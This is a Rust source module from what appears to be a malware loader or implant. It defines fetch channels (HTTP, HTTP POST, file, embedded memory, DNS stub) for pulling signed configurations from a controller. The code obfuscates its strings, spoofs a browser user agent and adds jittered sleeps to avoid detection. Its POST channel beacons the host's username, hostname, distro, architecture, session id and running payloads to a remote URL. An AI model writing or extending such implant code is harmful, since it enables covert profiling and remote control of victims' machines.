use crate::dataoperation::{DataOperation, UnApplyDataOperation};
use crate::poollink::Advanced;
use anyhow::bail;
use anyhow::Result;
use cryptify::encrypt_string;
use log::debug;
use log::info;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::io::Read;
use std::{thread, time};

use crate::config::Config;

use std::collections::HashMap;
use std::fs;
use std::time::Duration;

use crate::payload::Payload;

//TODO remove this from const, and find a way to define it globally with config for every Link.
const USER_AGENT: &str =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0";
const TIMEOUT: u64 = 10;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum Link {
    HTTP(HTTPLink),
    DNS(DNSLink),
    FILE(FileLink),
    MEMORY(MemoryLink),
    HTTPost(HTTPPostLink),
}
impl Link {
    pub fn print_link_compact(&self) {
        info!("{:?}", self);
    }

    pub fn fetch_config(
        &self,
        config: &Config,
        advanced: &Advanced,
        link_nb: i32,session_id: &String,running_thread: &Vec<Payload>
    ) -> Result<Config, anyhow::Error> {
        let result = self.fetch_data_with_post(session_id,running_thread);
        let data: Vec<u8> = match result {
            Ok(data) => data,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" fetch_data() error: "),
                error
            ),
        };
        debug!("{}", encrypt_string!("deserialized data"));
        let newconfig: Config = match serde_json::from_slice(&data) {
            Ok(newconfig) => newconfig,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" deserialized data error: "),
                error
            ),
        };
        match config.verify_newloader_sign(&newconfig) {
            Ok(()) => (),
            _unspecified => {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config signature: verify FAIL")
                )
            }
        }
        if advanced.accept_old == false {
            if config.date > newconfig.date {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config date: TOO OLD")
                )
            }
        };
        info!(
            "{}{}{}",
            encrypt_string!("link "),
            link_nb,
            encrypt_string!(" config signature: VERIFIED")
        );
        Ok(newconfig)
    }
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct HTTPLink {
    pub url: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}
#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct DNSLink {
    pub dns: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct FileLink {
    pub file_path: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct MemoryLink {
    pub memory_nb: i32,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct HTTPPostLink {
    pub url: String,
    pub dataoperation: Vec<DataOperation>,
    pub dataoperation_post: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

pub trait LinkFetch {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error>;
    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>) -> Result<Vec<u8>, anyhow::Error>;
    fn get_target(&self) -> String;
    fn get_dataoperation(&self) -> Vec<DataOperation>;
    fn get_sleep(&self) -> u64;
    fn get_jitt(&self) -> u64;

    fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.get_jitt() as f64) * random_number;
        let total_sleep = (self.get_sleep() as f64) + jitt;
        if total_sleep != 0.0 {
            info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        };
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        for operation in self.get_dataoperation() {
            data = operation.un_apply_one_operation(data)?;
        }
        Ok(data)
    }

    fn fetch_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data()?;
        self.un_apply_all_dataoperations(data)
    }

    fn fetch_data_with_post(&self,session_id: &String,running_thread: &Vec<Payload>
) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data_post(session_id,running_thread)?;
        self.un_apply_all_dataoperations(data)
    }

    //TODO apply all data_operation

}

//TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/

impl LinkFetch for Link {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Link::HTTP(link) => link.download_data(),
            Link::DNS(link) => link.download_data(),
            Link::FILE(link) => link.download_data(),
            Link::MEMORY(link) => link.download_data(),
            Link::HTTPost(link) => link.download_data(),
        }
    }

    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>
) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Link::HTTP(link) => link.download_data(),
            Link::DNS(link) => link.download_data(),
            Link::FILE(link) => link.download_data(),
            Link::MEMORY(link) => link.download_data(),
            Link::HTTPost(link) => link.fetch_data_with_post(session_id,running_thread),
        }
    }

    fn get_target(&self) -> String {
        match &self {
            Link::HTTP(link) => link.get_target(),
            Link::DNS(link) => link.get_target(),
            Link::FILE(link) => link.get_target(),
            Link::MEMORY(link) => link.get_target(),
            Link::HTTPost(link) => link.get_target(),
        }
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        match &self {
            Link::HTTP(link) => link.get_dataoperation(),
            Link::DNS(link) => link.get_dataoperation(),
            Link::FILE(link) => link.get_dataoperation(),
            Link::MEMORY(link) => link.get_dataoperation(),
            Link::HTTPost(link) => link.get_dataoperation(),
        }
    }

    fn get_sleep(&self) -> u64 {
        match &self {
            Link::HTTP(link) => link.get_sleep(),
            Link::DNS(link) => link.get_sleep(),
            Link::FILE(link) => link.get_sleep(),
            Link::MEMORY(link) => link.get_sleep(),
            Link::HTTPost(link) => link.get_sleep(),
        }
    }
    fn get_jitt(&self) -> u64 {
        match &self {
            Link::HTTP(link) => link.get_jitt(),
            Link::DNS(link) => link.get_jitt(),
            Link::FILE(link) => link.get_jitt(),
            Link::MEMORY(link) => link.get_jitt(),
            Link::HTTPost(link) => link.get_jitt(),
        }
    }
}

impl LinkFetch for FileLink {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}{}", encrypt_string!("File Open: "), &self.get_target());
        let file_bytes: Vec<u8> = fs::read(self.get_target())?;
        Ok(file_bytes)
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.file_path)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

// ----------- COMPILE TIME mEMORy
// MEMORY_1
#[rustfmt::skip]
#[cfg(not(feature="mem1"))]
static MEMORY_1 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem1",feature="ollvm"))]
static MEMORY_1 : &[u8] = include_bytes!("/projects/config/mem1");

#[rustfmt::skip]
#[cfg(all(feature="mem1",not(feature="ollvm")))]
static MEMORY_1 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem1"));

// MEMORY_2
#[rustfmt::skip]
#[cfg(not(feature="mem2"))]
static MEMORY_2 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem2",feature="ollvm"))]
static MEMORY_2 : &[u8] = include_bytes!("/projects/config/mem2");

#[rustfmt::skip]
#[cfg(all(feature="mem2",not(feature="ollvm")))]
static MEMORY_2 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem2"));

// MEMORY_3
#[rustfmt::skip]
#[cfg(not(feature="mem3"))]
static MEMORY_3 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem3",feature="ollvm"))]
static MEMORY_3 : &[u8] = include_bytes!("/projects/config/mem3");

#[rustfmt::skip]
#[cfg(all(feature="mem3",not(feature="ollvm")))]
static MEMORY_3 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem3"));

// MEMORY_4
#[rustfmt::skip]
#[cfg(not(feature="mem4"))]
static MEMORY_4 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem4",feature="ollvm"))]
static MEMORY_4 : &[u8] = include_bytes!("/projects/config/mem4");

#[rustfmt::skip]
#[cfg(all(feature="mem4",not(feature="ollvm")))]
static MEMORY_4 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem4"));

// ----------- COMPILE TIME mEMORy - end

impl LinkFetch for MemoryLink {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        match self.memory_nb {
            1 => Ok(MEMORY_1.to_vec()),
            2 => Ok(MEMORY_2.to_vec()),
            3 => Ok(MEMORY_3.to_vec()),
            4 => Ok(MEMORY_4.to_vec()),
            //TODO raise Error here
            _ => Ok(vec![]),
        }
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}{}", encrypt_string!("MEMORY_"), self.memory_nb)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for DNSLink {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.dns)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for HTTPLink {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(TIMEOUT))
            .user_agent(USER_AGENT)
            .build()?;

        let mut res = client.get(&self.get_target()).send()?;
        let mut body: Vec<u8> = Vec::new();
        res.read_to_end(&mut body)?;
        Ok(body)
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for HTTPPostLink {
    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>
    ) -> Result<Vec<u8>, anyhow::Error> {
        let mut map: HashMap<&str, String> = HashMap::new();

        map.insert("username", whoami::username());
        map.insert("distro", whoami::distro());
        map.insert("desktop_env", whoami::desktop_env().to_string());
        map.insert("arch", whoami::arch().to_string());
        map.insert("hostname", whoami::devicename());
        //TODO send real data
        map.insert("loader", "todo".to_string());
        map.insert("session_id", session_id.to_string());
        map.insert("config", "".to_string());
        //let t = serde_json::from_slice(running_thread);

        let t = format!("{:?}", running_thread);

        //map.insert("running-thread", "".to_string());
        map.insert("running-thread", t);
        map.insert("working-link", "".to_string());
        //TODO
        //map.insert("lang",whoami::distro());
        //map.insert("domain",domain_name());

        // Create a new client object
        //let client = reqwest::blocking::Client::new();
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(TIMEOUT))
            .user_agent(USER_AGENT)
            .build()?;

        let mut res = client.post(&self.get_target()).json(&map).send()?;
        let mut body: Vec<u8> = Vec::new();
        res.read_to_end(&mut body)?;
        Ok(body)
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}
